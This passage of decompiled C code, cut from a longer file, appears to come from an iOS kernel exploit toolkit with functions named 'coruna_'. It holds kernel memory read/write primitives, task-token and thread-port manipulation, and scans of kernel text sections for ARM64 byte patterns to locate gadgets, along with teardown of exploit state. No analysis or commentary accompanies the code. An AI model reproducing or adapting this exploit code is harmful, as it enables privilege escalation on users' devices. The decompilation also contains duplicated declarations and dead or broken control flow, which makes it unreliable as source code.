  if (*(long *)k_kernel_stack_chk_guard_slot != plist) {
  ___stack_chk_fail(err);
  }
  return;
}
void coruna_kernel509_via_macho_data_const(uint64_t *val,uint size)
{
  int err;
  void *ptr;
  
  ptr = _calloc(0x1d60,1);
  if (ptr != (void *)0x0) {
    err = coruna_macho_data_const(ptr,~size & 1);
    if (err == 0) {
      *val = ptr;
      coruna_kernel5_via_vm_allocate(ptr);
    }
    else {
      _free(ptr);
    }
  }
  return;
}
void coruna_kernel5_via_vm_allocate(long handle)
{
  if (*(long *)(&k_kernel_slot_19f8 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d18 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d20 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d28 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d30 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d38 + handle) != 0) {
    coruna_vm_allocate();
  }
  return;
}
void coruna_kernel509_residual_315(uint64_t val,uint64_t id_2)
{
  uint64_t in_stack_00000000;
  
  coruna_kernel509_via_fn_ptr_cast_10_30(val,id_2,in_stack_00000000);
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_30(long handle,unsigned long arg,int *flags)
{
  uint u;
  uint8_t *ptr;
  int err;
  unsigned long size;
  uint version;
  
  if (((arg >> 0x1e & 3) != 0) && (flags == (int *)0x0)) {
    return;
  }
  *(uint64_t *)(&k_kernel_slot_18c0 + handle) = 0;
  *(uint64_t *)(&k_kernel_slot_18b8 + handle) = 0;
  coruna_ctx_clear_flag(handle,0x800000);
  coruna_mach_absolute_time(handle);
  ptr = k_kernel_mach_task_self_slot;
  err = coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_6(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
  if (err != 0) {
    return;
  }
  version = (uint)arg;
  u = version >> 8 & 0xff;
  if (u == 1) {
    if (version == 0x40000105) {
      coruna_kernel509_via_kernel509_via_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_4(handle,flags,0x14);
    }
  }
  else if (u == 0) {
    if ((int)version < 0x16) {
      if ((int)version < 10) {
        if (version == 0xc000001b) {
          err = coruna_fn_ptr_cast_10(handle,0x5184001);
          if ((err != 0) ||
             ((err = coruna_fn_ptr_cast_10(handle,0x200), err != 0 &&
              (0x1808 < *(int *)(handle + 0x140))))) {
            coruna_kernel509_via_fn_ptr_cast_10_28(handle,*flags,flags + 1,(long)flags + 6,(long)flags + 5);
          }
        }
        else if (version == 8) {
          coruna_getuid(handle,0,0,0);
        }
        coruna_kernel5_via_vm_allocate(handle);
        return;
      }
      if (version == 10) {
        coruna_kernel509_via_fn_ptr_cast_10_8(handle,1);
        coruna_kernel5_via_vm_allocate(handle);
        return;
      }
      coruna_kernel5_via_vm_allocate(handle);
      return;
    }
    else {
      if (0x4000000f < (int)version) {
        if (version == 0x40000010) {
          err = *flags;
          if (err == 0) {
            err = *(int *)ptr;
            *flags = err;
          }
          coruna_cfdatagetbyteptr(handle,err,*(uint64_t *)(flags + 2),flags[5]);
        }
        else if (version == 0x4000001b) {
          err = coruna_fn_ptr_cast_10(handle,0x5184001);
          if (err == 0) {
            err = coruna_fn_ptr_cast_10(handle,0x200);
            coruna_kernel5_via_vm_allocate(handle);
            return;
          }
          else {
            size = coruna_kernel509_via_fn_ptr_cast_10_2(handle);
            coruna_kernel5_via_vm_allocate(handle);
            return;
          }
          err = *flags;
          if (err == 0) {
            err = *(int *)ptr;
            *flags = err;
          }
          coruna_kernel509_via_fn_ptr_cast_10_27(handle,err,(char)flags[1],*(uint8_t *)((long)flags + 6),
                       *(uint8_t *)((long)flags + 5));
        }
        coruna_kernel5_via_vm_allocate(handle);
        return;
      }
      if (version != 0x16) {
        if (version == 0x26) {
          coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_10(handle,*(uint32_t *)ptr);
        }
        coruna_kernel5_via_vm_allocate(handle);
        return;
      }
      err = *(int *)ptr;
      if ((int)flags != 0) {
        err = (int)flags;
      }
    }
    coruna_kernel509_via_fn_ptr_cast_10_26(handle,err,0);
  }
fail:
  coruna_kernel5_via_vm_allocate(handle);
  return;
}
void coruna_mach_thread_self_3087c(long handle)
{
  uint8_t *ptr;
  int err;
  mach_port_t lm3;
  mach_port_t lm4;
  uint32_t u;
  
  *(uint64_t *)(&k_kernel_slot_18c0 + handle) = 0;
  *(uint64_t *)(&k_kernel_slot_18b8 + handle) = 0;
  coruna_ctx_clear_flag(handle,0x800000);
  coruna_mach_absolute_time(handle);
  ptr = k_kernel_mach_task_self_slot;
  err = coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_6(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
  if (((err == 0) &&
      ((err = coruna_fn_ptr_cast_10(handle,4), err == 0 || (err = coruna_kernel509_via_fn_ptr_cast_10_8(handle,0), err != 0)
       ))) && ((*(long *)(&k_kernel_slot_1900 + handle) == 0 ||
               (err = coruna_task_info_2c258(handle,*(uint32_t *)ptr,2,&k_kernel_slot_1908 + handle,8),
               err != 0)))) {
    lm4 = *(mach_port_t *)(&k_kernel_slot_192c + handle);
    if ((1 < lm4 + 1) && (lm3 = _mach_thread_self(), lm4 == lm3)) {
      lm4 = _mach_thread_self();
      u = 0x4000000;
      if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
        u = 1;
      }
      err = coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_7(handle,lm4,u,0);
      if (err == 0) {
        return;
      }
    }
    if (((*(int *)(&k_kernel_slot_1910 + handle) == 0 && *(int *)(&k_kernel_slot_1914 + handle) == 0) ||
        (err = coruna_getuid(handle,*(int *)(&k_kernel_slot_1910 + handle),
                              *(int *)(&k_kernel_slot_1914 + handle),0), err != 0)) &&
       ((lm4 = _mach_host_self(), lm4 == *(mach_port_t *)(&k_kernel_slot_1928 + handle) ||
        ((err = coruna_fn_ptr_cast_10(handle,0x10), err != 0 ||
         (err = coruna_host_security_set_task_token(handle,*(uint32_t *)ptr,
                               *(uint32_t *)(&k_kernel_slot_1928 + handle)), err != 0)))))) {
      coruna_kernel5_via_vm_allocate(handle);
    }
  }
  return;
}
void coruna_pthread_mutex_destroy(byte *arg)
{
  pthread_mutex_t *ptr;
  uint8_t *ptr;
  int err;
  uint64_t *buf;
  uint64_t *str;
  uint32_t scratch;
  
  coruna_kernel509_via_fn_ptr_cast_10();
  coruna_kernel5_via_mach_port_allocate(arg);
  ptr = k_kernel_mach_task_self_slot;
  if (*(long *)(arg + 0x1d0) != 0) {
    coruna_kernel509_via_helper_5d2c_419fc_2(arg);
  }
  if (1 < *(mach_port_name_t *)(arg + 0x1918) + 1) {
    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,*(mach_port_name_t *)(arg + 0x1918)
              );
  }
  if ((((*(int *)(arg + 0x1938) != -1) || (*(int *)(arg + 0x193c) != -1)) ||
      (*(int *)(arg + 0x1930) != -1)) ||
     ((*(int *)(arg + 0x1934) != -1 || (*(int *)(arg + 0x1940) != -1)))) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      if (*(int *)(arg + 0x1938) != -1) {
        _close(*(int *)(arg + 0x1938));
        arg[0x1938] = 0xff;
        arg[0x1939] = 0xff;
        arg[0x193a] = 0xff;
        arg[0x193b] = 0xff;
      }
      if (*(int *)(arg + 0x193c) != -1) {
        _close(*(int *)(arg + 0x193c));
        arg[0x193c] = 0xff;
        arg[0x193d] = 0xff;
        arg[0x193e] = 0xff;
        arg[0x193f] = 0xff;
      }
      if (*(int *)(arg + 0x1940) != -1) {
        _close(*(int *)(arg + 0x1940));
        arg[0x1940] = 0xff;
        arg[0x1941] = 0xff;
        arg[0x1942] = 0xff;
        arg[0x1943] = 0xff;
      }
      if (*(int *)(arg + 0x1930) != -1) {
        _close(*(int *)(arg + 0x1930));
        arg[0x1930] = 0xff;
        arg[0x1931] = 0xff;
        arg[0x1932] = 0xff;
        arg[0x1933] = 0xff;
      }
      if (*(int *)(arg + 0x1934) != -1) {
        _close(*(int *)(arg + 0x1934));
        arg[0x1934] = 0xff;
        arg[0x1935] = 0xff;
        arg[0x1936] = 0xff;
        arg[0x1937] = 0xff;
      }
      coruna_close(scratch);
    }
  }
  if (*(long *)(arg + 0x28) != 0) {
    coruna_semaphore_destroy(arg,1);
  }
  if ((0x27120f04b00002 < *(unsigned long *)(arg + 0x158)) && ((*arg >> 5 & 1) != 0)) {
    coruna_kernel509_via_open_dev_null(arg);
  }
  if (*(long *)(arg + 0x1d48) != 0) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      coruna_vm_deallocate_1cda0(arg);
      coruna_close(scratch);
    }
  }
  if (1 < *(int *)(arg + 0x5c) + 1U) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      coruna_mach_port_deallocate_1cb2c(arg);
      coruna_close(scratch);
    }
  }
  if (1 < *(int *)(arg + 0xac) + 1U) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      coruna_pthread_from_mach_thread_np_1cbd8(arg);
      coruna_close(scratch);
    }
  }
  coruna_pthread_mach_thread_np(arg);
  _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)(arg + 0x1920));
  if (1 < *(mach_port_name_t *)(arg + 0x1924) + 1) {
    _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)(arg + 0x1924));
  }
  if (1 < *(int *)(arg + 0x10) + 1U) {
    _IOObjectRelease();
  }
  if (1 < *(int *)(arg + 0x18d8) + 1U) {
    arg[0x18d8] = 0;
    arg[0x18d9] = 0;
    arg[0x18da] = 0;
    arg[0x18db] = 0;
  }
  if ((*(vm_address_t *)(arg + 0x118) != 0) && (*(vm_size_t *)(arg + 0x120) != 0)) {
    _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(arg + 0x118),
                   *(vm_size_t *)(arg + 0x120));
  }
  if (1 < *(semaphore_t *)(arg + 0x264) + 1) {
    _semaphore_destroy(*(task_t *)ptr,*(semaphore_t *)(arg + 0x264));
    arg[0x264] = 0;
    arg[0x265] = 0;
    arg[0x266] = 0;
    arg[0x267] = 0;
  }
  ptr = (pthread_mutex_t *)(arg + 0x330);
  err = _pthread_mutex_lock(ptr);
  if (err == 0) {
    buf = *(uint64_t **)(arg + 0x370);
    arg[0x370] = 0;
    arg[0x371] = 0;
    arg[0x372] = 0;
    arg[0x373] = 0;
    arg[0x374] = 0;
    arg[0x375] = 0;
    arg[0x376] = 0;
    arg[0x377] = 0;
    while (buf != (uint64_t *)0x0) {
      if (1 < *(mach_port_name_t *)((long)buf + 0x1c) + 1) {
        _mach_port_mod_refs(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)buf + 0x1c),1,-1);
      }
      str = (uint64_t *)*buf;
      buf[4] = 0;
      buf[1] = 0;
      *buf = 0;
      buf[3] = 0;
      buf[2] = 0;
      _free(buf);
      buf = str;
    }
    _pthread_mutex_unlock(ptr);
  }
  _pthread_mutex_destroy(ptr);
  _pthread_mutex_destroy((pthread_mutex_t *)(arg + 0x268));
  if (*(long *)(arg + 0x1d18) != 0) {
    coruna_kernel5_via_vm_deallocate_12c18();
    _free(*(void **)(arg + 0x1d18));
    arg[0x1d18] = 0;
    arg[0x1d19] = 0;
    arg[0x1d1a] = 0;
    arg[0x1d1b] = 0;
    arg[0x1d1c] = 0;
    arg[0x1d1d] = 0;
    arg[0x1d1e] = 0;
    arg[0x1d1f] = 0;
  }
  if (*(long *)(arg + 0x1d20) != 0) {
    coruna_kernel5_via_vm_deallocate_12c18();
    _free(*(void **)(arg + 0x1d20));
    arg[0x1d20] = 0;
    arg[0x1d21] = 0;
    arg[0x1d22] = 0;
    arg[0x1d23] = 0;
    arg[0x1d24] = 0;
    arg[0x1d25] = 0;
    arg[0x1d26] = 0;
    arg[0x1d27] = 0;
  }
  if (*(long *)(arg + 0x1d28) != 0) {
    coruna_kernel5_via_vm_deallocate_12c18();
    _free(*(void **)(arg + 0x1d28));
    arg[0x1d28] = 0;
    arg[0x1d29] = 0;
    arg[0x1d2a] = 0;
    arg[0x1d2b] = 0;
    arg[0x1d2c] = 0;
    arg[0x1d2d] = 0;
    arg[0x1d2e] = 0;
    arg[0x1d2f] = 0;
  }
  if (*(long *)(arg + 0x1d30) != 0) {
    coruna_kernel5_via_vm_deallocate_12c18();
    _free(*(void **)(arg + 0x1d30));
    arg[0x1d30] = 0;
    arg[0x1d31] = 0;
    arg[0x1d32] = 0;
    arg[0x1d33] = 0;
    arg[0x1d34] = 0;
    arg[0x1d35] = 0;
    arg[0x1d36] = 0;
    arg[0x1d37] = 0;
  }
  if (*(long *)(arg + 0x1d38) != 0) {
    coruna_kernel5_via_vm_deallocate_12c18();
    _free(*(void **)(arg + 0x1d38));
    arg[0x1d38] = 0;
    arg[0x1d39] = 0;
    arg[0x1d3a] = 0;
    arg[0x1d3b] = 0;
    arg[0x1d3c] = 0;
    arg[0x1d3d] = 0;
    arg[0x1d3e] = 0;
    arg[0x1d3f] = 0;
  }
  if (*(long *)(arg + 0x1a00) != 0) {
    coruna_kernel5_via_vm_deallocate_12c18();
    _free(*(void **)(arg + 0x1a00));
    arg[0x1a00] = 0;
    arg[0x1a01] = 0;
    arg[0x1a02] = 0;
    arg[0x1a03] = 0;
    arg[0x1a04] = 0;
    arg[0x1a05] = 0;
    arg[0x1a06] = 0;
    arg[0x1a07] = 0;
  }
  if (*(long *)(arg + 0x19f8) != 0) {
    coruna_kernel5_via_vm_deallocate_12c18();
    _free(*(void **)(arg + 0x19f8));
    arg[0x19f8] = 0;
    arg[0x19f9] = 0;
    arg[0x19fa] = 0;
    arg[0x19fb] = 0;
    arg[0x19fc] = 0;
    arg[0x19fd] = 0;
    arg[0x19fe] = 0;
    arg[0x19ff] = 0;
  }
  if (*(void **)(arg + 0x1d10) != (void *)0x0) {
    _free(*(void **)(arg + 0x1d10));
    arg[0x1d10] = 0;
    arg[0x1d11] = 0;
    arg[0x1d12] = 0;
    arg[0x1d13] = 0;
    arg[0x1d14] = 0;
    arg[0x1d15] = 0;
    arg[0x1d16] = 0;
    arg[0x1d17] = 0;
    arg[0x1d08] = 0;
    arg[0x1d09] = 0;
    arg[0x1d0a] = 0;
    arg[0x1d0b] = 0;
  }
  if (1 < *(mach_port_name_t *)(arg + 0xe8) + 1) {
    _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)(arg + 0xe8));
    arg[0xe8] = 0;
    arg[0xe9] = 0;
    arg[0xea] = 0;
    arg[0xeb] = 0;
  }
  _bzero(arg,0x1d60);
  _free(arg);
  return;
}
void coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_7(long handle,uint64_t val,uint size,int flags)
{
  int err;
  long handle;
  uint u;
  uint scratch;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_22_2();
  }
  else {
    handle = coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_4_3();
    if (handle == 0) {
      return;
    }
    handle = handle + 0x28;
  }
  if ((handle != 0) && (err = coruna_kernel509_via_mach_vm_read_overwrite(handle,handle,&scratch), err != 0)) {
    u = 0xfffffffe;
    if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      u = 0xf0000000;
    }
    if ((u & scratch) == 0) {
      u = scratch | size;
      if (flags == 0) {
        u = scratch & (size ^ 0xffffffff);
      }
      if (u != scratch) {
        coruna_kernel509_via_fn_ptr_cast_10_13(handle,handle);
      }
    }
  }
  return;
}
void coruna_find_text_exec_4010c(long handle,long *addr_2,long *off_3)
{
  char *ptr;
  int err;
  long handle;
  long addr;
  uint8_t scratch[8];
  long bootargs;
  long thread_attr;
  long host_info;
  
  host_info = 0;
  if ((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) {
    addr = 0;
  }
  else {
    handle = *(long *)(*(long *)(handle + 0x118) + 0x148);
    host_info = handle;
    err = coruna_fn_ptr_cast_10(handle,0x5184001);
    if ((err == 0) && (handle != 0)) {
      *addr_2 = handle;
      return;
    }
    addr = *(long *)(*(long *)(handle + 0x118) + 0x140);
    err = coruna_fn_ptr_cast_10(handle,0x5184001);
    if ((err != 0) && (handle != 0 && addr != 0)) {
      *addr_2 = handle;
      *off_3 = addr;
      return;
    }
  }
  err = coruna_fn_ptr_cast_10(handle,0x20);
  if (err == 0) {
    err = coruna_fn_ptr_cast_10(handle,0x5184001);
    if (err == 0) {
      coruna_find_ppltext_3b194(scratch,handle);
      if (bootargs == 0) {
        return;
      }
      if (thread_attr == 0) {
        return;
      }
      if (*(unsigned long *)(handle + 0x158) < 0x225c192d100000) {
        handle = coruna_strsep(scratch,"09 FD 9F 08 C0 03 5F D6",0,1);
        if (handle == 0) {
          return;
        }
        host_info = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0xc);
      }
      else {
        handle = coruna_strsep(scratch,"09 01 00 39 C0 03 5F D6",0,1);
        if (handle == 0) {
          return;
        }
        handle = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0xc);
        if (handle == 0) {
          return;
        }
        host_info = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle);
      }
      if (host_info == 0) {
        return;
      }
      handle = 0;
      *addr_2 = host_info;
    }
    else {
      err = *(int *)(handle + 0x140);
      coruna_find_ppltext_3b194(scratch,handle);
      if (bootargs == 0) {
        return;
      }
      if (thread_attr == 0) {
        return;
      }
      ptr = "6B 00 00 37 40 00 00 34";
      if (err < 0x225c) {
        ptr = "6A 00 00 37 40 00 00 34";
      }
      addr = coruna_strsep(scratch,ptr,0,1);
      if (addr == 0) {
        return;
      }
      handle = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr + -0x10);
      if (handle == 0) {
        return;
      }
      host_info = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr + -8);
      if (host_info == 0) {
        return;
      }
      *addr_2 = host_info;
      addr = handle;
    }
  }
  else {
    coruna_macho_map_segsect(scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle),"__TEXT_EXEC","__text");
    if (bootargs == 0) {
      return;
    }
    if (thread_attr == 0) {
      return;
    }
    handle = coruna_strsep(scratch,"08 01 40 39 08 01 00 12",0,1);
    if (handle == 0) {
      return;
    }
    handle = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0xc);
    if (handle == 0) {
      return;
    }
    err = coruna_kernel509_residual_307(handle,handle,&host_info);
    if (err == 0) {
      return;
    }
    *addr_2 = host_info;
    handle = host_info + -1;
  }
  *off_3 = handle;
  handle = *(long *)(handle + 0x118);
  if ((handle != 0) && (*(long *)(handle + 0x120) != 0)) {
    *(long *)(handle + 0x140) = addr;
    *(long *)(handle + 0x148) = host_info;
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_stub(uint64_t val,uint64_t id_2)
{
  uint64_t *ptr;
  void *ptr;
  void *buf;
  uint64_t u;
  size_t ls5;
  
  ptr = _calloc(1,0x18);
  ptr = _calloc(1,0x48);
  coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub(val,id_2,ptr,0x48,1);
  *ptr = ptr;
  ls5 = *(size_t *)((long)ptr + 0x20);
  buf = _malloc(ls5);
  coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub(val,*(uint64_t *)((long)ptr + 0x18),buf,ls5,1);
  u = *(uint64_t *)((long)ptr + 0x20);
  ptr[1] = buf;
  ptr[2] = u;
  return;
}
void coruna_fn_ptr_cast_12(void)
{
  return;
}
void coruna_ret_stub_4(uint64_t *val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_kernel509_residual_316(val,*val,id_2,size_3,off_4);
  return;
}
void coruna_kernel509_residual_316(uint64_t val,long handle,long addr_2,long off_3,uint size)
{
  unsigned long u;
  unsigned long size;
  long handle;
  
  size = *(unsigned long *)(handle + 8);
  u = size + *(long *)(handle + 0x10) + (unsigned long)size * -4;
  if (u <= size) {
    return;
  }
  do {
    if (size == 0) {
      return;
    }
    handle = 0;
    while ((*(uint *)(off_3 + handle) & *(uint *)(size + handle)) == *(uint *)(addr_2 + handle)) {
      handle = handle + 4;
      if ((unsigned long)size * 4 - handle == 0) {
        return;
      }
    }
    size = size + 4;
  } while (size < u);
  return;
}
void coruna_ret_stub_5(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_kernel509_residual_316(handle,*(uint64_t *)(handle + 8),val,id_2,size_3);
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(long handle,char *path)
{
  int err;
  int status;
  unsigned long u;
  uint64_t size;
  long handle;
  char scratch [16];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  handle = **(long **)(handle + 0x10);
  err = coruna_kernel509_residual_294(*(long **)(handle + 0x10),handle);
  if ((err == -0x1120531) &&
     (err = coruna_kernel509_residual_294(*(uint64_t *)(handle + 0x10),handle + 0x10), err != 0)) {
    handle = handle + 0x20;
    do {
      status = coruna_kernel509_residual_294(*(uint64_t *)(handle + 0x10),handle);
      u = coruna_kernel509_residual_294(*(uint64_t *)(handle + 0x10),handle + 4);
      if (status == 0x19) {
        scratch[0] = '\0';
        scratch[1] = '\0';
        scratch[2] = '\0';
        scratch[3] = '\0';
        scratch[4] = '\0';
        scratch[5] = '\0';
        scratch[6] = '\0';
        scratch[7] = '\0';
        scratch[8] = '\0';
        scratch[9] = '\0';
        scratch[10] = '\0';
        scratch[0xb] = '\0';
        scratch[0xc] = '\0';
        scratch[0xd] = '\0';
        scratch[0xe] = '\0';
        scratch[0xf] = '\0';
        coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub(*(uint64_t *)(handle + 0x10),handle + 8,scratch,0x10,1);
        status = _strcmp(scratch,path);
        if (status == 0) {
          size = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_stub(*(uint64_t *)(handle + 0x10),handle);
          if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
          return;
          }
          ___stack_chk_fail(size);
        }
      }
      handle = handle + (u & 0xffffffff);
      err = err + -1;
    } while (err != 0);
  }
  size = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(size);
}
void coruna_find_text_exec_407c0(uint64_t *val)
{
  uint64_t u;
  
  u = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(val,"__TEXT_EXEC");
  *val = u;
  u = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(val,"__DATA_CONST");
  val[1] = u;
  return;
}
void coruna_kernel509_residual_317(long handle,uint size)
{
  uint u;
  uint size;
  uint version;
  uint port;
  uint tag;
  uint kind;
  
  u = *(uint *)(handle + 0x180);
  kind = 0;
  if (u != 0) {
    kind = size / u;
  }
  if (size == kind * u) {
    return;
  }
  kind = u << 1;
  tag = u;
  if (0x8000 < kind) {
    return;
  }
  do {
    size = 0;
    if (size != 0) {
      size = kind / size;
    }
    version = 0;
    if (kind != 0) {
      version = ((kind - size * size) * 100) / kind;
    }
    size = 0;
    if (size != 0) {
      size = tag / size;
    }
    port = 0;
    if (tag != 0) {
      port = ((tag - size * size) * 100) / tag;
    }
    size = kind;
    if (port <= version) {
      size = tag;
    }
    kind = kind + u;
    tag = size;
  } while (kind < 0x8001);
  return;
}
void coruna_helper_12310_40910(void)
{
  return;
}
void coruna_kernel509_via_u64_pack_2(long handle,uint64_t *val,uint *size)
{
  int err;
  uint64_t u;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  uint64_t type_id;
  bool err;
  int status;
  
  version = k_kernel_rodata_word_00043828;
  size = k_kernel_rodata_word_43820;
  u = k_kernel_rodata_word_43810;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if (err || err == status) {
    if (val != (uint64_t *)0x0) {
      if (*size < 0x1b) {
        return;
      }
      val[1] = k_kernel_rodata_word_00043818;
      *val = u;
      val[3] = version;
      val[2] = size;
      tag = k_kernel_rodata_word_00043848;
      port = k_kernel_rodata_word_43840;
      version = k_kernel_rodata_word_00043838;
      size = k_kernel_rodata_word_43830;
      u = coruna_u64_pack((k_kernel_rodata_word_00043870), (k_kernel_rodata_word_4386c));
      *(uint64_t *)((long)val + 100) = k_kernel_rodata_word_00043874;
      *(uint64_t *)((long)val + 0x5c) = u;
      type_id = k_kernel_rodata_word_43860;
      kind = k_kernel_rodata_word_43850;
      u = coruna_u64_pack((k_kernel_rodata_word_4386c), (k_kernel_rodata_word_00043868));
      val[9] = k_kernel_rodata_word_00043858;
      val[8] = kind;
      val[0xb] = u;
      val[10] = type_id;
      val[5] = version;
      val[4] = size;
      val[7] = tag;
      val[6] = port;
    }
    *size = 0x1b;
  }
  return;
}
void coruna_kernel509_via_kernel509_via_u64_pack_2(uint64_t val,uint size)
{
  int err;
  uint u;
  unsigned long size;
  uint *ptr;
  uint scratch;
  uint bootargs [64];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0x40;
  err = coruna_kernel509_via_u64_pack_2(val,bootargs,&scratch);
  if ((err == 0) && (size = (unsigned long)scratch, scratch != 0)) {
    ptr = bootargs;
    do {
      u = *ptr;
      if (*(long *)k_kernel_stack_chk_guard_slot != thread_attr) {
      ___stack_chk_fail(u);
      }
      return;
    } while (size != 0);
  }
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != thread_attr) {
    ___stack_chk_fail(u);
  }
  return;
}
void coruna_kernel509_residual_318(long handle,unsigned long arg,uint size,uint flags_2)
{
  unsigned long u;
  unsigned long size;
  long handle;
  uint version;
  unsigned long port;
  unsigned long tag;
  long addr;
  
  tag = (unsigned long)*(uint *)(handle + 0x180);
  if (*(uint *)(handle + 0x180) != flags_2) {
    version = 0;
    if (size != 0) {
      version = flags_2 / size;
    }
    size = 0;
    if (0x44a < *(unsigned long *)(handle + 0x158) >> 0x2b) {
      size = (unsigned long)(flags_2 - version * size);
    }
    u = arg + size;
    port = 0;
    if (tag != 0) {
      port = u / tag;
    }
    addr = u - port * tag;
    handle = 0;
    if (addr != 0) {
      handle = tag - addr;
    }
    do {
      if (size == (*(unsigned long *)(handle + 0x188) & arg)) {
        return;
      }
      arg = arg - size;
    } while ((u - flags_2) + handle <= arg);
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_3(long handle,char *path)
{
  int err;
  long handle;
  long addr;
  char *ptr;
  long off;
  long base;
  bool err;
  char *scratch [4];
  long bootargs;
  long thread_attr;
  uint8_t host_info[24];
  char serial_buf [80];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  if (*(int *)(handle + 0x140) - 0x1f53U < 2) {
    off = 0xa8;
    base = 0x289;
  }
  else {
    if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
    }
    ___stack_chk_fail();
  }
  handle = *(long *)(&k_kernel_slot_19a0 + handle);
  if (handle == 0) {
    ptr = "08 29 40 92 09 15 80 52";
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      ptr = "28 69 68 78 09 11 80 52";
    }
    scratch[1] = (char *)0x0;
    err = true;
    handle = 1;
    scratch[0] = ptr;
    do {
      if (ptr != (char *)0x0) {
        coruna_macho_text_sect(host_info,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
        addr = coruna_strsep(host_info,ptr,0,0);
        if (addr != 0) {
          handle = coruna_ret_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr + 8);
          if (handle != 0) {
            *(long *)(&k_kernel_slot_19a0 + handle) = handle;
            break;
          }
          if (*(long *)k_kernel_stack_chk_guard_slot == action) {
          return;
          }
          ___stack_chk_fail();
        }
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail();
    } while( true );
  }
  base = base + -1;
  do {
    handle = off + handle;
    scratch[3] = *(char **)(&k_kernel_slot_19f8 + handle);
    bootargs = handle;
    thread_attr = off;
    addr = coruna_kernel5_residual_226(scratch + 3,1);
    if (addr == 0) break;
    coruna_call_mach_vm_machine_attribute_1d4f8(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr,off,0);
    if (*(long *)(addr + 0x10) != 0) {
      scratch[3] = *(char **)(&k_kernel_slot_19f8 + handle);
      thread_attr = 0x50;
      bootargs = *(long *)(addr + 0x10);
      ptr = (char *)coruna_kernel5_residual_226(scratch + 3,0);
      if (ptr == (char *)0x0) {
        ptr = serial_buf;
        serial_buf[0] = '\0';
        coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(uint64_t *)(addr + 0x10),0x50,serial_buf);
      }
      else {
        coruna_call_mach_vm_machine_attribute_1d4f8(*(uint64_t *)(&k_kernel_slot_19f8 + handle),ptr,0x50,0);
      }
      err = _strcmp(path,ptr);
      if (err == 0) break;
    }
    base = base + -1;
  } while (base != 0);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
